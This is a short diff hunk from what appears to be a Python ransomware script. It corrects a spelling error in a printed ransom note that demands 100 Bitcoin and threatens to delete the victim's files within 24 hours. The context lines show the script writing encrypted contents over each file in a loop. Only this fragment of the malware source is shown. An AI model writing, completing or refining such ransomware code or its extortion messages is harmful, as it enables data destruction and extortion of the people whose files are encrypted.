@@ -29,4 +29,4 @@ for file in files:
 		thefile.write(contents_encrypted)
 
 
-print("All of your files have been encrypted!! Send me 100 Bitcoin or I'll deelte them in 24 hours.")
+print("All of your files have been encrypted!! Send me 100 Bitcoin or I'll delete them in 24 hours.")
